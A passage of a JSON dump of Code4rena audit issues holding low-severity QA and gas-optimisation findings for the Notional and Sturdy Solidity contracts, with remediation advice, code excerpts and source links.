    "body": "# QA (LOW & NON-CRITICAL)\n\n## [L-01] Use of floating pragma\n Floating Pragma used in `wfCashERC4626.sol`. Contracts should be deployed with the same compiler version and flags that they have been tested with thoroughly. Locking the pragma (i.e. by not using ^)  helps to ensure that contracts do not accidentally get deployed using, for example, an outdated compiler version that might introduce bugs that affect the contract system negatively.\n[Reference](https://swcregistry.io/docs/SWC-103)\n\n## [L-02] Different and outdated compiler versions\n The scoped contracts have different solidity compiler ranges (0.6.10 - 0.8.11) referenced. This leads to potential security flaws between deployed contracts depending on the compiler version chosen for any particular file. It also greatly increases the cost of maintenance as different compiler versions have different semantics and behavior. Current Solidity version available is 0.8.14\n\n## [L-03] Missing checks for contract existence\nOpenZeppelin's `safeTransfer` and `safeTransferFrom` functions use `functionCall` of Address.sol which is a low level call.\nHowever, it's stated that the target must be a contract and code existence should be checked prior using. [Reference](https://docs.openzeppelin.com/contracts/4.x/api/utils#Address-functionCall-address-bytes-) \nIt's advised to check code existence prior calling safeTransfer or safeTransferFrom as below;\nIn wfCashLogic.sol, \n```solidity\n84: token.safeTransferFrom(msg.sender, address(this), depositAmountExternal);\n311: token.safeTransfer(receiver, tokensTransferred);\n```\n\n## [L-04] Missing of zero address checks for the immutables\nNo `address(0)` or Zero value check at the constructors of:\nIn WrappedfCashFactory.sol;\n```solidity\n    constructor(address _beacon) {\n        BEACON = _beacon;\n    }\n```\nIn wfCashBase.sol;\n```solidity\n    constructor(INotionalV2 _notional, WETH9 _weth) initializer {\n        NotionalV2 = _notional;\n        WETH = _weth;\n    }\n```\nIn wfCashERC4626.sol;\n```solidity\nconstructor(INotionalV2 _notional, WETH9 _weth) wfCashLogic(_notional, _weth) {}\n```\nIn wfCashLogic.sol;\n```solidity\nconstructor(INotionalV2 _notional, WETH9 _weth) wfCashBase(_notional, _weth) {}\n```\nIn NotionalTradeModule.sol;\n```solidity\nconstructor(\n        IController _controller,\n        IWrappedfCashFactory _wrappedfCashFactory,\n        IERC20 _weth\n\n    )\n        public\n        ModuleBase(_controller)\n    {\n        wrappedfCashFactory = _wrappedfCashFactory;\n        weth = _weth;\n    }\n```\n\n## [L-05] Missing address comparison after Create2 function\nWrappedfCashFactory uses Solidity's Create2 function to deploy the wrappers. In case of a deployment failure it will revert as zero address and will throw an error. However, a good practice is to compare the `_computedWrapper` address with the deployed `wrapper` same as in Solidity's official page [here](https://docs.soliditylang.org/en/latest/control-structures.html?highlight=create2#salted-contract-creations-create2)\n```solidity\ncontract C {\n    function createDSalted(bytes32 salt, uint arg) public {\n        // This complicated expression just tells you how the address\n        // can be pre-computed. It is just there for illustration.\n        // You actually only need ``new D{salt: salt}(arg)``.\n        address predictedAddress = address(uint160(uint(keccak256(abi.encodePacked(\n            bytes1(0xff),\n            address(this),\n            salt,\n            keccak256(abi.encodePacked(\n                type(D).creationCode,\n                abi.encode(arg)\n            ))\n        )))));\n\n        D d = new D{salt: salt}(arg);\n        require(address(d) == predictedAddress);\n    }\n}\n```\n## [L-06] Unbounded loop on array can lead to DoS\nProgramming patterns such as looping over arrays of unknown size may lead to DoS when the gas cost of execution exceeds the block gas limit. [Reference](https://swcregistry.io/docs/SWC-128)\nInstances in NotionalTradeModule.sol;\n1. https://github.com/code-423n4/2022-06-notional-coop/blob/6f8c325f604e2576e2fe257b6b57892ca181509a/index-coop-notional-trade-module/contracts/protocol/modules/v1/NotionalTradeModule.sol#L246-L259\n2. https://github.com/code-423n4/2022-06-notional-coop/blob/6f8c325f604e2576e2fe257b6b57892ca181509a/index-coop-notional-trade-module/contracts/protocol/modules/v1/NotionalTradeModule.sol#L385-L410 (This function is inlined to  externally called functions)\n\n## [L-07] External Calls inside a loop\nCalls to external contracts inside a loop are dangerous (especially if the loop index can be user-controlled) because it could lead to DoS if one of the calls reverts or execution runs out of gas. Avoid calls within loops, check that loop index cannot be user-controlled or is bounded.[Reference](https://swcregistry.io/docs/SWC-113)\n\nInstances in NotionalTradeModule.sol;\n1. https://github.com/code-423n4/2022-06-notional-coop/blob/6f8c325f604e2576e2fe257b6b57892ca181509a/index-coop-notional-trade-module/contracts/protocol/modules/v1/NotionalTradeModule.sol#L219-L241\n2. https://github.com/code-423n4/2022-06-notional-coop/blob/6f8c325f604e2576e2fe257b6b57892ca181509a/index-coop-notional-trade-module/contracts/protocol/modules/v1/NotionalTradeModule.sol#L246-L259\n\n## [L-08] wfCashERC4626 is not as per EIP4626 standard \nEIP4626 requires `deposit` and `withdraw` functions having event with indexed parameters for `caller`, `owner` and `receiver`. However, this pattern is not followed.\n[Reference](https://eips.ethereum.org/EIPS/eip-4626)\n\n\n## [N-01] Some `require` statements don't throw error message\nSome require statements in the scoped contracts don't throw error. In case of any error pops up, it will not be possible to know the error source. The list is as below;\n1. https://github.com/code-423n4/2022-06-notional-coop/blob/6f8c325f604e2576e2fe257b6b57892ca181509a/notional-wrapped-fcash/contracts/wfCashERC4626.sol#L42\n2. https://github.com/code-423n4/2022-06-notional-coop/blob/6f8c325f604e2576e2fe257b6b57892ca181509a/notional-wrapped-fcash/contracts/wfCashERC4626.sol#L245\n3. https://github.com/code-423n4/2022-06-notional-coop/blob/6f8c325f604e2576e2fe257b6b57892ca181509a/notional-wrapped-fcash/contracts/wfCashLogic.sol#L129\n4. https://github.com/code-423n4/2022-06-notional-coop/blob/6f8c325f604e2576e2fe257b6b57892ca181509a/notional-wrapped-fcash/contracts/wfCashLogic.sol#L316\n\n## [N-02] Scoped contracts are missing proper NatSpec comments\nThe scoped contracts are missing proper NatSpec comments such as @notice @dev @param on many places.It is recommended that Solidity contracts are **fully** annotated using NatSpec for all public interfaces (**everything in the ABI**) [Reference](https://docs.soliditylang.org/en/latest/style-guide.html#natspec) ",
    "dataSource": {
      "name": "code-423n4/2022-06-notional-coop-findings",
      "repo": "https://github.com/code-423n4/2022-06-notional-coop-findings",
      "url": "https://github.com/code-423n4/2022-06-notional-coop-findings/issues/192"
    }
  },
  {
    "title": "QA Report",
    "body": " # C4-001 : The Contract Should approve(0) first\n\n## Impact  - LOW\n\nSome tokens (like USDT L199) do not work when changing the allowance from an existing non-zero allowance value.\nThey must first be approved by zero and then the actual allowance must be approved.\n\n```\nIERC20(token).safeApprove(address(operator), 0);\nIERC20(token).safeApprove(address(operator), amount);\n```\n\n## Proof of Concept\n\n1. Navigate to the following contracts.\n\n```\nhttps://github.com/code-423n4/2022-05-sturdy/blob/main/smart-contracts/ConvexCurveLPVault.sol#L141\n\nhttps://github.com/code-423n4/2022-05-sturdy/blob/main/smart-contracts/ConvexCurveLPVault.sol#L146\n\n```\n\n2.  When trying to re-approve an already approved token, all transactions revert and the protocol cannot be used.\n\n## Tools Used\n\nNone\n\n## Recommended Mitigation Steps\n\nApprove with a zero amount first before setting the actual amount. Consider use safeIncreaseAllowance and safeDecreaseAllowance.\n\n\n# C4-002 : Check if amount > 0 before token transfer\n\n## Impact\n\nSince _amount can be 0. Checking if (_amount != 0) before the transfer can potentially save an external call and the unnecessary gas cost of a 0 token transfer.\n\n## Proof of Concept\n\n```\nhttps://github.com/code-423n4/2022-05-sturdy/blob/main/smart-contracts/LidoVault.sol#L57\n\n```\n\nAll Contracts\n\n## Tools Used\n\nNone\n\n## Recommended Mitigation Steps\n\nConsider checking amount != 0.\n\n# C4-003 : Front-runnable Initializers\n\n## Impact - LOW\n\nAll contract **initializers** were missing access controls, allowing any user to initialize the contract. By front-running the contract deployers to initialize the contract, the incorrect parameters may be supplied, leaving the contract needing to be redeployed.\n\n\n## Proof of Concept\n\n1. Navigate to the following contracts.\n\n```\nhttps://github.com/code-423n4/2022-05-sturdy/blob/main/smart-contracts/YieldManager.sol#L60\n\nhttps://github.com/code-423n4/2022-05-sturdy/blob/main/smart-contracts/GeneralVault.sol#L61\n```\n\n2. initialize functions does not have access control. They are vulnerable to front-running.\n\n## Tools Used\n\nManual Code Review\n\n## Recommended Mitigation Steps\n\nWhile the code that can be run in contract constructors is limited, setting the owner in the contract's constructor to the `msg.sender` and adding the `onlyOwner` modifier to all **initializers** would be a sufficient level of access control.\n\n\n# C4-004 : # Missing zero-address check in the setter functions and initiliazers\n\n## Impact\n\nMissing checks for zero-addresses may lead to infunctional protocol, if the variable addresses are updated incorrectly.\n\n## Proof of Concept\n\n1. Navigate to the following contracts.\n\n```\nhttps://github.com/code-423n4/2022-05-sturdy/blob/main/smart-contracts/ConvexCurveLPVault.sol#L37\n\nhttps://github.com/code-423n4/2022-05-sturdy/blob/main/smart-contracts/YieldManager.sol#L60\n\nhttps://github.com/code-423n4/2022-05-sturdy/blob/main/smart-contracts/GeneralVault.sol#L61\n\nhttps://github.com/code-423n4/2022-05-sturdy/blob/main/smart-contracts/YieldManager.sol#L92\n\n```\n\n## Tools Used\n\nCode Review\n\n## Recommended Mitigation Steps\n\nConsider adding zero-address checks in the discussed constructors:\nrequire(newAddr != address(0));.\n\n\n\n# C4-005 : Missing events for only functions that change critical parameters\n\n## Impact - Non critical\n\nThe afunctions that change critical parameters should emit events. Events allow capturing the changed parameters so that off-chain tools/interfaces can register such changes with timelocks that allow users to evaluate them and consider if they would like to engage/exit based on how they perceive the changes as affecting the trustworthiness of the protocol or profitability of the implemented financial services. The alternative of directly querying on-chain contract state for such changes is not considered practical for most users/usages.\n\nMissing events and timelocks do not promote transparency and if such changes immediately affect users’ perception of fairness or trustworthiness, they could exit the protocol causing a reduction in liquidity which could negatively impact protocol TVL and reputation.\n\n\n## Proof of Concept\n\n1. Navigate to the following contract.\n\n```\nhttps://github.com/code-423n4/2022-05-sturdy/blob/main/smart-contracts/YieldManager.sol#L64\n\n```\n\nSee similar High-severity H03 finding OpenZeppelin’s Audit of Audius (https://blog.openzeppelin.com/audius-contracts-audit/#high) and Medium-severity M01 finding OpenZeppelin’s Audit of UMA Phase 4 (https://blog.openzeppelin.com/uma-audit-phase-4/)\n\n## Tools Used\n\nNone\n\n## Recommended Mitigation Steps\n\nAdd events to all functions that change critical parameters.\n\n\n# C4-006 : Critical changes should use two-step procedure\n\n## Impact - NON CRITICAL\n\nThe critical procedures should be two step process.\n\n## Proof of Concept\n\n1. Navigate to the following contract.\n\n```\nhttps://github.com/code-423n4/2022-05-sturdy/blob/main/smart-contracts/ConvexCurveLPVault.sol#L37\n```\n\n## Tools Used\n\nCode Review\n\n## Recommended Mitigation Steps\n\nLack of two-step procedure for critical operations leaves them error-prone. Consider adding two step procedure on the critical functions.\n\n\n# C4-007 : # Pragma Version\n\n## Impact\n\nIn the contracts, floating pragmas should not be used. Contracts should be deployed with the same compiler version and flags that they have been tested with thoroughly. Locking the pragma helps to ensure that contracts do not accidentally get deployed using, for example, an outdated compiler version that might introduce bugs that affect the contract system negatively.\n\n## ## Proof of Concept\n\nhttps://swcregistry.io/docs/SWC-103\n\n```\nAll Contracts\n```\n\n## Tools Used\nManual code review\n\n## Recommended Mitigation Steps\n\nUpgrade pragma solidity 0.8.10.\n\n\n# C4-008: transferOwnership should be two step\n\n## Impact - NON CRITICAL\n\nThe owner is the authorized user in the solidity contracts. Usually, an owner can be updated with transferOwnership function. However, the process is only completed with single transaction. If the address is updated incorrectly, an owner functionality will be lost forever.\n\n## Proof of Concept\n\n1. Navigate to the following contracts.\n\n```\nhttps://github.com/code-423n4/2022-05-sturdy/blob/main/smart-contracts/YieldManager.sol#L26\n```\n\n## Tools Used\n\nCode Review\n\n## Recommended Mitigation Steps\n\nLack of two-step procedure for critical operations leaves them error-prone. Consider adding two step procedure on the critical functions.\n\n\n# C4-009 : # Missing Re-entrancy Guard\n\n## Impact - LOW\n\nThe re-entrancy guard is missing on the some of the functions. The external interactions can cause to the re-entrancy vulnerability.\n\n## Proof of Concept\n\n1. Navigate to the following contract.\n\n```\nhttps://github.com/code-423n4/2022-05-sturdy/blob/main/smart-contracts/LidoVault.sol#L30\n\nhttps://github.com/code-423n4/2022-05-sturdy/blob/main/smart-contracts/ConvexCurveLPVault.sol#L131\n```\n\n## Tools Used\n\nCode Review\n\n## Recommended Mitigation Steps\n\nFollow the check effect interaction pattern or put re-entrancy guard.\n\n\n# C4-010 : Incompatibility With Rebasing/Deflationary/Inflationary tokens\n\n## Impact -  LOW\n\nPrePo protocol do not appear to support rebasing/deflationary/inflationary tokens whose balance changes during transfers or over time. The necessary checks include at least verifying the amount of tokens transferred to contracts before and after the actual transfer to infer any fees/interest.\n\n## Proof of Concept\n\n1. Navigate to the following contract.\n\n```\nhttps://github.com/code-423n4/2022-05-sturdy/blob/main/smart-contracts/ConvexCurveLPVault.sol#L138\n```\n\n## Tools Used\n\nManual Code Review\n\n## Recommended Mitigation Steps\n\n- Ensure that to check previous balance/after balance  equals to amount for any rebasing/inflation/deflation\n- Add support in contracts for such tokens before accepting user-supplied tokens\n- Consider supporting deflationary / rebasing / etc tokens by extra checking the balances before/after or strictly inform your users not to use such tokens if they don't want to lose them.\n\n\n# C4-011 : Contract should have pause/unpause functionality\n\n## Impact\n\nIn case a hack is occuring or an exploit is discovered, the team (or validators in this case) should be able to pause\nfunctionality until the necessary changes are made to the system. Additionally, the gravity.sol contract should be manged by proxy so that upgrades can be made by the validators.\n\nBecause an attack would probably span a number of blocks, a method for pausing the contract would be able to interrupt any such attack if discovered.\n\nTo use a thorchain example again, the team behind thorchain noticed an attack was going to occur well before\nthe system transferred funds to the hacker. However, they were not able to shut the system down fast enough.\n(According to the incidence report here: https://github.com/HalbornSecurity/PublicReports/blob/master/Incident%20Reports/Thorchain_Incident_Analysis_July_23_2021.pdf)\n\n\n## Proof of Concept\n\nhttps://github.com/code-423n4/2022-05-sturdy/blob/main/smart-contracts/ConvexCurveLPVault.sol#L138\n\n## Tools Used\n\nCode Review\n\n## Recommended Mitigation Steps\n\nPause functionality on the contract would have helped secure the funds quickly.",
    "dataSource": {
      "name": "code-423n4/2022-05-sturdy-findings",
      "repo": "https://github.com/code-423n4/2022-05-sturdy-findings",
      "url": "https://github.com/code-423n4/2022-05-sturdy-findings/issues/160"
    }
  },
  {
    "title": "QA Report",
    "body": "## L-01: _depositYield() doesn’t use SafeERC20 for approvals\n\n## L-02: Use safeIncreaseAllowance() instead of safeApprove()\n\n## L-03: Verify curveLPToken matches with Convex booster’s convexPoolId\n\n## L-04: ConvexCurveLPVault: Ensure 0 msg.value in _depositToYieldPool()\n\n## L-05: LidoVault: Restrict ETH sender to WETH contract\n\n## NC-01: Spelling errors\n\n- [mount](https://github.com/code-423n4/2022-05-sturdy/blob/78f51a7a74ebe8adfd055bdbaedfddc05632566f/smart-contracts/YieldManager.sol#L217) → amount\n- [_interalToken](https://github.com/code-423n4/2022-05-sturdy/blob/78f51a7a74ebe8adfd055bdbaedfddc05632566f/smart-contracts/ConvexCurveLPVault.sol#L43) → _internalToken",
    "dataSource": {
      "name": "code-423n4/2022-05-sturdy-findings",
      "repo": "https://github.com/code-423n4/2022-05-sturdy-findings",
      "url": "https://github.com/code-423n4/2022-05-sturdy-findings/issues/146"
    }
  },
  {
    "title": "Gas Optimizations",
    "body": "Solidity 6.12 you need to use safemath library and in newer version of solidity the compiler checks overflow/underflow which saves gas\nhttps://github.com/code-423n4/2022-05-sturdy/blob/6cc44472f6321d0be6844d6fe7fbd7b78d7602a9/smart-contracts/CollateralAdapter.sol#L2\nhttps://github.com/code-423n4/2022-05-sturdy/blob/6cc44472f6321d0be6844d6fe7fbd7b78d7602a9/smart-contracts/GeneralVault.sol#L2\nhttps://github.com/code-423n4/2022-05-sturdy/blob/6cc44472f6321d0be6844d6fe7fbd7b78d7602a9/smart-contracts/LidoVault.sol#L2\n\n\nMake  onlyadmin and initializer functions payable because it doesn't check msg.value == 0 because it saves gas \nhttps://github.com/code-423n4/2022-05-sturdy/blob/6cc44472f6321d0be6844d6fe7fbd7b78d7602a9/smart-contracts/CollateralAdapter.sol#L37\nhttps://github.com/code-423n4/2022-05-sturdy/blob/6cc44472f6321d0be6844d6fe7fbd7b78d7602a9/smart-contracts/CollateralAdapter.sol#L45\nhttps://github.com/code-423n4/2022-05-sturdy/blob/6cc44472f6321d0be6844d6fe7fbd7b78d7602a9/smart-contracts/ConvexCurveLPVault.sol#L49\nhttps://github.com/code-423n4/2022-05-sturdy/blob/6cc44472f6321d0be6844d6fe7fbd7b78d7602a9/smart-contracts/ConvexCurveLPVault.sol#L114\nhttps://github.com/code-423n4/2022-05-sturdy/blob/6cc44472f6321d0be6844d6fe7fbd7b78d7602a9/smart-contracts/GeneralVault.sol#L68\nhttps://github.com/code-423n4/2022-05-sturdy/blob/6cc44472f6321d0be6844d6fe7fbd7b78d7602a9/smart-contracts/GeneralVault.sol#L183\nhttps://github.com/code-423n4/2022-05-sturdy/blob/6cc44472f6321d0be6844d6fe7fbd7b78d7602a9/smart-contracts/LidoVault.sol#L32\nhttps://github.com/code-423n4/2022-05-sturdy/blob/6cc44472f6321d0be6844d6fe7fbd7b78d7602a9/smart-contracts/YieldManager.sol#L63\nhttps://github.com/code-423n4/2022-05-sturdy/blob/6cc44472f6321d0be6844d6fe7fbd7b78d7602a9/smart-contracts/YieldManager.sol#L67\nhttps://github.com/code-423n4/2022-05-sturdy/blob/6cc44472f6321d0be6844d6fe7fbd7b78d7602a9/smart-contracts/YieldManager.sol#L76\nhttps://github.com/code-423n4/2022-05-sturdy/blob/6cc44472f6321d0be6844d6fe7fbd7b78d7602a9/smart-contracts/YieldManager.sol#L96\nhttps://github.com/code-423n4/2022-05-sturdy/blob/6cc44472f6321d0be6844d6fe7fbd7b78d7602a9/smart-contracts/YieldManager.sol#L124\n\n\n—------------------------------------------------------------------------------------------------------\nUse revert instead of require statement and if you upgrade to 0.8.0 and up then gas is lower  \nhttps://github.com/code-423n4/2022-05-sturdy/blob/6cc44472f6321d0be6844d6fe7fbd7b78d7602a9/smart-contracts/ConvexCurveLPVault.sol#L51\nhttps://github.com/code-423n4/2022-05-sturdy/blob/6cc44472f6321d0be6844d6fe7fbd7b78d7602a9/smart-contracts/ConvexCurveLPVault.sol#L88\nhttps://github.com/code-423n4/2022-05-sturdy/blob/6cc44472f6321d0be6844d6fe7fbd7b78d7602a9/smart-contracts/ConvexCurveLPVault.sol#L124\nhttps://github.com/code-423n4/2022-05-sturdy/blob/6cc44472f6321d0be6844d6fe7fbd7b78d7602a9/smart-contracts/ConvexCurveLPVault.sol#L173\nhttps://github.com/code-423n4/2022-05-sturdy/blob/6cc44472f6321d0be6844d6fe7fbd7b78d7602a9/smart-contracts/ConvexCurveLPVault.sol#L237\nhttps://github.com/code-423n4/2022-05-sturdy/blob/6cc44472f6321d0be6844d6fe7fbd7b78d7602a9/smart-contracts/GeneralVault.sol#L34\nhttps://github.com/code-423n4/2022-05-sturdy/blob/6cc44472f6321d0be6844d6fe7fbd7b78d7602a9/smart-contracts/GeneralVault.sol#L40\nhttps://github.com/code-423n4/2022-05-sturdy/blob/6cc44472f6321d0be6844d6fe7fbd7b78d7602a9/smart-contracts/GeneralVault.sol#L199\nhttps://github.com/code-423n4/2022-05-sturdy/blob/6cc44472f6321d0be6844d6fe7fbd7b78d7602a9/smart-contracts/LidoVault.sol#L95\nhttps://github.com/code-423n4/2022-05-sturdy/blob/6cc44472f6321d0be6844d6fe7fbd7b78d7602a9/smart-contracts/LidoVault.sol#L106\nhttps://github.com/code-423n4/2022-05-sturdy/blob/6cc44472f6321d0be6844d6fe7fbd7b78d7602a9/smart-contracts/LidoVault.sol#L158\nhttps://github.com/code-423n4/2022-05-sturdy/blob/6cc44472f6321d0be6844d6fe7fbd7b78d7602a9/smart-contracts/YieldManager.sol#L102\nhttps://github.com/code-423n4/2022-05-sturdy/blob/6cc44472f6321d0be6844d6fe7fbd7b78d7602a9/smart-contracts/YieldManager.sol#L218\n\n—----------------------------------------------------------------------------------------------------------------------------\nhttps://docs.soliditylang.org/en/v0.8.13/abi-spec.html#:~:text=Through%20abi.,place%20and%20without%20the%20length. abi.encoded packed, packs the string to ?  mayabe use  bytes to save gas bec it's less than 32 bytes\nhttps://github.com/code-423n4/2022-05-sturdy/blob/6cc44472f6321d0be6844d6fe7fbd7b78d7602a9/smart-contracts/ConvexCurveLPVault.sol#L60\nhttps://github.com/code-423n4/2022-05-sturdy/blob/6cc44472f6321d0be6844d6fe7fbd7b78d7602a9/smart-contracts/ConvexCurveLPVault.sol#L59\n—----------------------------------------------------------------------------------------------------------------------------\nWe can make this != because _vault fee cant  be less than  zero,uint256 internal _vaultFee \nThis will save gas because it only needs to check for anything less than zero \nhttps://github.com/code-423n4/2022-05-sturdy/blob/6cc44472f6321d0be6844d6fe7fbd7b78d7602a9/smart-contracts/ConvexCurveLPVault.sol#L95\n///@audit change >0 to != because its uint and is always greater or equal to zero \n    require(yieldStAsset > 0, Errors.VT_PROCESS_YIELD_INVALID);\n\nhttps://github.com/code-423n4/2022-05-sturdy/blob/6cc44472f6321d0be6844d6fe7fbd7b78d7602a9/smart-contracts/LidoVault.sol#L40\n\nWaste of variables in memory because we can just put it into function instead \nhttps://github.com/code-423n4/2022-05-sturdy/blob/6cc44472f6321d0be6844d6fe7fbd7b78d7602a9/smart-contracts/ConvexCurveLPVault.sol#L97\nyieldAmount=yieldAmount.sub(_processTreasury(_asset, yieldAmount)); this instead \n\nyou can get rid of baseRewardPool and just put the function inside function bec view function does not cast gas its  just reading of blockchain but the variable is mstore\nhttps://github.com/code-423n4/2022-05-sturdy/blob/6cc44472f6321d0be6844d6fe7fbd7b78d7602a9/smart-contracts/ConvexCurveLPVault.sol#L117\nsaves 6 gas mstore and mload just combine and save gas _transferYield(IRewards(IConvexBaseRewardPool(getBaseRewardPool()).extraRewards(i)).rewardToken());\nhttps://github.com/code-423n4/2022-05-sturdy/blob/6cc44472f6321d0be6844d6fe7fbd7b78d7602a9/smart-contracts/ConvexCurveLPVault.sol#L142\n—--------------------------------------------\nalready returns uint8 no need for a extra variable\n10**IERC20Detailed(internalAssetToken).decimals()\n\nhttps://github.com/code-423n4/2022-05-sturdy/blob/6cc44472f6321d0be6844d6fe7fbd7b78d7602a9/smart-contracts/ConvexCurveLPVault.sol#L159\naddress baseRewardPool = getBaseRewardPool();\n    IConvexBaseRewardPool(baseRewardPool).withdrawAndUnwrap(_amount, true);\n We can remove baseRewardPool and just put into the function \nhttps://github.com/code-423n4/2022-05-sturdy/blob/6cc44472f6321d0be6844d6fe7fbd7b78d7602a9/smart-contracts/ConvexCurveLPVault.sol#L203\n—----------------------------------------------------------------------------------------------------\n     ///@audit save gas by removing decimal varible  bec it already returns a uint8\n     // uint256 decimal = IERC20Detailed(_asset).decimals();\n     \n      _amount = _amountToWithdraw.mul(this.pricePerShare()).div(10**IERC20Detailed(_asset).decimals());\n\nRemove decimal variable https://github.com/code-423n4/2022-05-sturdy/blob/6cc44472f6321d0be6844d6fe7fbd7b78d7602a9/smart-contracts/GeneralVault.sol#L136\n—---------------------------------------------------------------\nuint256 yieldStAsset = _getYieldAmount(_stAsset);\nWaste of yieldstasset you can just return the function and put it into the line after\nhttps://github.com/code-423n4/2022-05-sturdy/blob/6cc44472f6321d0be6844d6fe7fbd7b78d7602a9/smart-contracts/GeneralVault.sol#L196\n—----------------------------------------------------------\n//uint256 treasuryStETH = _processTreasury(yieldStETH);\n      yieldStETH = yieldStETH.sub(_processTreasury(yieldStETH));\nYou can just remove treasury stEth and save mstore and mload \n—---------------------------------\na waste of variable  you can just use _amount or msg.value in the field\nassetAmount = msg.value;\nThis it a waste just use msg.value and with the  assetAmount you can get rid off because you can just use _amount \n—-------------------------------------------------------\nInstead of _amount just put it into the function \n// uint256 _amount = IERC20Detailed(asset).balanceOf(address(this));\n      _convertAssetToExchangeToken(asset,  IERC20Detailed(asset).balanceOf(address(this)));\n\n\nhttps://github.com/code-423n4/2022-05-sturdy/blob/6cc44472f6321d0be6844d6fe7fbd7b78d7602a9/smart-contracts/YieldManager.sol#L132\n   uint256 _amount = _convertToStableCoin(assetYields[i].asset, assetYields[i].amount);\n        // 3. deposit Yield to pool for suppliers\n        _depositYield(assetYields[i].asset, _amount);\n\nTake out _amount and just put that into _depositYield\nhttps://github.com/code-423n4/2022-05-sturdy/blob/6cc44472f6321d0be6844d6fe7fbd7b78d7602a9/smart-contracts/YieldManager.sol#L145\n\n—-------------------------------------------------------------------------------------------------------------------------- \n++i costs less gas compared to i++ or i += 1\n++i costs less gas compared to i++ or i += 1 for unsigned integer, as pre-increment is cheaper (about 5 gas per iteration). This statement is true even with the optimizer enabled. i++ increments i and returns the initial value of i. Which means:\nuint i = 1; i++; // == 1 but i == 2\nBut ++i returns the actual incremented value:\nuint i = 1; ++i; // == 2 and i == 2 too, so no need for a temporary variable In the first case, the compiler has to create a temporary variable (when used) for returning 1 instead of 2\n\nhttps://github.com/code-423n4/2022-05-sturdy/blob/6cc44472f6321d0be6844d6fe7fbd7b78d7602a9/smart-contracts/ConvexCurveLPVault.sol#L137\nhttps://github.com/code-423n4/2022-05-sturdy/blob/6cc44472f6321d0be6844d6fe7fbd7b78d7602a9/smart-contracts/GeneralVault.sol#L238\nhttps://github.com/code-423n4/2022-05-sturdy/blob/6cc44472f6321d0be6844d6fe7fbd7b78d7602a9/smart-contracts/YieldManager.sol#L127\nhttps://github.com/code-423n4/2022-05-sturdy/blob/6cc44472f6321d0be6844d6fe7fbd7b78d7602a9/smart-contracts/YieldManager.sol#L141\n\n\nmake indexed for 3 fields if there are more than 3 fields\nhttps://github.com/code-423n4/2022-05-sturdy/blob/6cc44472f6321d0be6844d6fe7fbd7b78d7602a9/smart-contracts/GeneralVault.sol#L27\nhttps://github.com/code-423n4/2022-05-sturdy/blob/6cc44472f6321d0be6844d6fe7fbd7b78d7602a9/smart-contracts/GeneralVault.sol#L29\n you can add 256-160 uint96 to this struct if you want without any gas cost\nhttps://github.com/code-423n4/2022-05-sturdy/blob/6cc44472f6321d0be6844d6fe7fbd7b78d7602a9/smart-contracts/GeneralVault.sol#L49\nhttps://github.com/code-423n4/2022-05-sturdy/blob/6cc44472f6321d0be6844d6fe7fbd7b78d7602a9/smart-contracts/YieldManager.sol#L32\n\n you can add 96 uint for free bec mapping starts a new slot and address takes up 160 bits out of 256 bits\nhttps://github.com/code-423n4/2022-05-sturdy/blob/6cc44472f6321d0be6844d6fe7fbd7b78d7602a9/smart-contracts/YieldManager.sol#L45\n make it _assetList array in memory bec of mappings isn't to bad for gas but its still a lot of gas of storage and  its still in a function in a  for loop, find way to not use it for a memory variable at least\n address asset = _assetsList[_offset + i];\nhttps://github.com/code-423n4/2022-05-sturdy/blob/6cc44472f6321d0be6844d6fe7fbd7b78d7602a9/smart-contracts/YieldManager.sol#L129\n\nmake it default variable of zero and not initialized   the variable to save gas becuase this var is only assigned after and its assignment now is doesn't need it bec it's already a variable in use \nAlso because _totalYieldAmount is used in the math calculation only.\nuint256 extraYieldAmount = _totalYieldAmount;\n",
    "dataSource": {
      "name": "code-423n4/2022-05-sturdy-findings",
      "repo": "https://github.com/code-423n4/2022-05-sturdy-findings",
      "url": "https://github.com/code-423n4/2022-05-sturdy-findings/issues/143"
    }
  },
  {
    "title": "QA Report",
    "body": "## QA (LOW & NON-CRITICAL)\n  \n* At GeneralVault.sol,the modifiers onlyAdmin and onlyYieldProcessor are throwing the same error string which might be confusing to identify the cause of error incase both are used in the same function.\n\n* The project uses Solidity version 0.6.12. Using an old version prevents access to new Solidity security checks. However the current version is 0.8.13 with more benefits and less bugs.\n\n*  Any unused imports, inherited contracts, functions, parameters, variables, modifiers, events or return values should be removed (or used appropriately) after careful evaluation. This will not only reduce gas costs but improve readability and maintainability of the code. At `GeneralVault.sol#L136` unused parameter: `_asset`, at` LidoVault.sol#L91` unused local variable: `bytes memory data`, at` LidoVault.sol#L109` unused parameter: `address _asset`, at` LidoVault.sol#L140` unused local variable: `bytes memory data`, at `ConvexCurveLPVault.sol#154` unused parameter: `address _asset`,\n\n* At LidoVault.sol, the slippage is hardcoded to 200 inside `swapExactTokensForTokens()`  which yields to %2 and it most likely will revert during volatile market conditions and it will not be possible to save economic value of the assets by not being able to withdraw ETH.\n\n* ConvexCurveLPVault.sol uses `abi.encodePacked()`. Using `abi.encodePacked()` with multiple variable length arguments can, in certain situations, lead to a hash collision.  Instead `abi.encode()` can be used. [Reference Link](https://swcregistry.io/docs/SWC-133)\n\n* At YieldManager.sol, `setCurvePool()` function, there is no address(0) check for the parameters.\n\n* While swapping the assets, the contracts using deprecated `safeApprove`. [Link](https://docs.openzeppelin.com/contracts/4.x/api/token/erc20#SafeERC20-safeApprove-contract-IERC20-address-uint256-)\n\n* At YieldManager.sol, `distributeYield()` function, an expensive loop is used by incrementing state_variable in a loop incurs a lot of gas because of expensive SSTOREs, which might lead to an out-of-gas and revert\n\n```solidity\nfunction distributeYield(uint256 _offset, uint256 _count) external onlyAdmin {\n    // 1. convert from asset to exchange token via uniswap\n    for (uint256 i = 0; i < _count; i++) {\n      address asset = _assetsList[_offset + i];\n      require(asset != address(0), Errors.UL_INVALID_INDEX);\n      uint256 _amount = IERC20Detailed(asset).balanceOf(address(this));\n      _convertAssetToExchangeToken(asset, _amount);\n    }\n    uint256 exchangedAmount = IERC20Detailed(_exchangeToken).balanceOf(address(this));\n\n    // 2. convert from exchange token to other stable assets via curve swap\n    AssetYield[] memory assetYields = _getAssetYields(exchangedAmount);\n    for (uint256 i = 0; i < assetYields.length; i++) {\n      if (assetYields[i].amount > 0) {\n        uint256 _amount = _convertToStableCoin(assetYields[i].asset, assetYields[i].amount);\n        // 3. deposit Yield to pool for suppliers\n        _depositYield(assetYields[i].asset, _amount);\n      }\n    }\n  }\n  ```\n\n  * At YieldManager.sol, _convertAssetToExchangeToken() function converts the assets to exchange token at the limits of the slippage. However, there is no oracle provided and the AMM prices are subject to manipulation. The team might consider to add a function parameter for minimum tokens to receive.\n",
    "dataSource": {
